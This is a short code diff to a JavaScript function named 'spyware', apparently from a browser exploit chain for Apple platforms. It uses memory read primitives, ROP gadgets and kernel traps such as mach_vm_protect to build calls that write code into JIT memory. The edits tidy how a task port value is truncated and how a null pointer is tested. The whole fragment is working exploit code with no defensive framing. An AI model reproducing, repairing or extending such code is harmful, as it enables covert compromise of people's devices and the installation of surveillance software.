@@ -379,9 +379,7 @@ function spyware(stage1, memory, binary)
     var stackloader         = gadgets["stackloader"];
     var ldrx8               = gadgets["ldrx8"]; // might be undefined, then superb llvm gadgets are assumed
     var movx4               = gadgets["movx4"]; // might be undefined, then superb llvm gadgets are assumed
-    var mach_task_self_     = memory.readInt64(syms["_mach_task_self_"]);
-    // zero higher bytes
-    mach_task_self_         = new Int64(mach_task_self_.bytes().map((v, i)=>i<4?v:0));
+    var mach_task_self_     = new Int64(memory.readInt64(syms["_mach_task_self_"]).lo());
     var mach_vm_protect     = syms["__kernelrpc_mach_vm_protect_trap"];
     var memmove             = syms["__platform_memmove"];
     var usleep              = syms["_usleep"];
@@ -704,7 +702,7 @@ function spyware(stage1, memory, binary)
             , shsz               // size
         );
     } else {
-        if (jitWriteSeparateHeaps != '0x0000000000000000') {
+        if (jitWriteSeparateHeaps.lo() || jitWriteSeparateHeaps.hi()) {
             add_call(jitWriteSeparateHeaps
                 , Sub(codeAddr, memPoolStart)     // off
                 , paddr                           // src
